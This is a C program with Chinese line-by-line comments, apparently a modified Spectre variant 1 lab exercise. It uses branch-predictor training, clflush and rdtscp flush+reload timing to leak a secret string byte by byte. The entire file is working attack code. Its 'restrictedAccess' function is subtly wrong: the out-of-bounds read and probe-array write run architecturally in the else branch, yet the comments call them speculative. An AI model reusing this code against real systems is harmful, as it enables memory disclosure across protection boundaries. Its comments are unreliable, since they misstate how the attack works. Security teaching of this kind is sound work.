#include <emmintrin.h>  // 包含 SIMD 指令集扩展头文件
#include <x86intrin.h>  // 包含 x86 架构内在函数头文件
#include <stdlib.h>  // 包含标准库函数，如 malloc、exit 等
#include <stdio.h>  // 包含标准输入输出函数，如 printf
#include <stdint.h>  // 包含标准整数类型定义，如 uint8_t
#include <string.h>  // 包含字符串操作函数，如 memset

// 以下是全局变量声明
unsigned int buffer_size = 10;  // 定义缓冲区大小为 10
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};  // 初始化缓冲区数组，用于训练
uint8_t temp = 0;  // 定义临时变量 temp，初始化为 0
char *secret = "Some Secret Value";  // 定义指向秘密字符串的指针
uint8_t array[256*4096];  // 定义大型数组，用于侧信道攻击

// 定义常量
#define CACHE_HIT_THRESHOLD (80)  // 定义缓存命中时间阈值
#define DELTA 1024  // 定义数组偏移量

// 修改后的沙箱函数 - 添加了推测执行逻辑
uint8_t restrictedAccess(size_t x)  // 定义受限访问函数，参数为 size_t x
{  // 函数体开始
  if (x < buffer_size) {  // 如果 x 小于缓冲区大小
     return buffer[x];  // 返回缓冲区中 x 位置的值
  } else {  // 否则
     // 添加推测执行逻辑来访问秘密值
     uint8_t secret_value = buffer[x];  // 在推测执行中读取秘密值
     array[secret_value * 4096 + DELTA] += 88;  // 在推测执行中更新数组
     return 0;  // 返回 0
  }   // if-else 结束
}  // 函数结束

// 刷新侧信道函数
void flushSideChannel()  // 定义刷新侧信道函数
{  // 函数体开始
  int i;  // 声明循环变量 i
  // Write to array to bring it to RAM to prevent Copy-on-write  // 英文注释：将数组写入 RAM 以防止写时复制
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;  // 循环初始化数组到 RAM
  //flush the values of the array from cache  // 英文注释：从缓存刷新数组值
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);  // 循环刷新缓存
}  // 函数结束

// 分数数组和重载函数
static int scores[256];  // 声明静态分数数组 scores
void reloadSideChannelImproved()  // 定义改进的重载侧信道函数
{  // 函数体开始
int i;  // 声明循环变量 i
  volatile uint8_t *addr;  // 声明 volatile 地址指针
  register uint64_t time1, time2;  // 声明寄存器时间变量
  int junk = 0;  // 声明垃圾变量 junk
  for (i = 0; i < 256; i++) {  // 循环 256 次
    addr = &array[i * 4096 + DELTA];  // 设置地址
    time1 = __rdtscp(&junk);  // 读取时间戳 1
    junk = *addr;  // 访问地址
    time2 = __rdtscp(&junk) - time1;  // 计算时间差
    if (time2 <= CACHE_HIT_THRESHOLD)  // 如果时间小于阈值
      scores[i]++; /* if cache hit, add 1 for this value */  // 增加分数，英文注释：如果缓存命中，为该值加 1
  }   // 循环结束
}  // 函数结束

// Spectre 攻击函数
void spectreAttack(size_t larger_x)  // 定义 Spectre 攻击函数，参数 larger_x
{  // 函数体开始
  int i;  // 声明循环变量 i
  uint8_t s;  // 声明临时变量 s
  volatile int z;  // 声明 volatile 延迟变量 z
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }  // 刷新数组缓存
  // Train the CPU to take the true branch inside victim().  // 英文注释：训练 CPU 走 victim 函数的 true 分支
  for (i = 0; i < 10; i++) {  // 训练循环 10 次
    _mm_clflush(&buffer_size);  // 刷新缓冲区大小
    for (z = 0; z < 100; z++) { }  // 空循环延迟
    restrictedAccess(i);    // 调用受限访问进行训练
  }  // 训练结束
  // Flush buffer_size and array[] from the cache.  // 英文注释：从缓存刷新 buffer_size 和 array
  _mm_clflush(&buffer_size);  // 刷新缓冲区大小
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }  // 刷新数组
  // Ask victim() to return the secret in out-of-order execution.  // 英文注释：请求 victim 在乱序执行中返回秘密
  for (z = 0; z < 100; z++) { }  // 空循环延迟
  s = restrictedAccess(larger_x);  // 调用受限访问
  // 注意：这里不再需要 array[s*4096 + DELTA] += 88; 
  // 因为已经在 restrictedAccess 函数中完成了这个操作
}  // 函数结束

// 主函数
int main() {  // 主函数开始
  int i;  // 声明循环变量 i
  uint8_t s;  // 声明临时变量 s
  for (int x = 0; x<17; x++)  // 循环 17 次，读取每个秘密字符
  {  // 循环体开始
    memset(scores, 0, sizeof(scores));  // 清零分数数组
    size_t larger_x = (size_t)(secret-(char*)buffer + x);  // 计算越界索引
    flushSideChannel();  // 调用刷新侧信道
    for(i=0;i<256; i++) scores[i]=0;   // 清零分数
    for (i = 0; i < 1000; i++) {  // 攻击循环 1000 次
      spectreAttack(larger_x);  // 执行 Spectre 攻击
      reloadSideChannelImproved();  // 重载侧信道
    }  // 循环结束
    int max = 1;  // 初始化 max 为 1
    for (i = 1; i < 256; i++){  // 查找最大分数
     if(scores[max] < scores[i])    // 如果当前分数更高
       max = i;  // 更新 max
    }  // 循环结束
    printf("Reading secret value at %p = ", (void*)larger_x);  // 打印读取地址
    printf("The  secret value is %d \t %c\n", max,max);  // 打印秘密值和字符
    printf("The number of hits is %d\n", scores[max]);  // 打印命中次数
  }  // 外层循环结束
  return (0);   // 返回 0
}  // 主函数结束